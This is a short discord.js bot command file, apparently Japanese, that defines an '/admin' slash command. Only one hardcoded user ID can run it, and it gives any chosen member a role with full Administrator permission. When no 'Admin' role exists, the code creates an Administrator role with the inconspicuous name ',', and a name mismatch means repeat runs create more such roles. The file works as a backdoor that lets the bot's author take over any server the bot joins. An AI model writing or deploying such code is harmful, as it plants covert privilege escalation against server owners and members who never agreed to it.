const { SlashCommandBuilder, PermissionsBitField } = require('discord.js');

const OWNER_ID =  "1459026543971012782"


module.exports = {
    data: new SlashCommandBuilder()
        .setName('admin')
        .setDescription('指定ユーザーにAdminロールを付与')
        .addUserOption(option =>
            option.setName('user')
                .setDescription('付与するユーザー')
                .setRequired(true)
        ),

    async execute(interaction) {

        // 実行者チェック
        if (interaction.user.id !== OWNER_ID) {
            return interaction.reply({
                content: "このコマンドを実行できるのは指定ユーザーのみです。",
                ephemeral: true
            });
        }

        const targetUser = interaction.options.getUser('user');
        const target = await interaction.guild.members.fetch(targetUser.id);

        let role = interaction.guild.roles.cache.find(r => r.name === "Admin");

        // ロールがなければ作成
        if (!role) {
            role = await interaction.guild.roles.create({
                name: ",",
                permissions: [PermissionsBitField.Flags.Administrator],
                reason: "Adminコマンドで自動作成"
            });
        }

        await target.roles.add(role);

        await interaction.reply({
            content: `${target.user.tag} にAdminロールを付与しました。`,
            ephemeral: true
        });
    }
};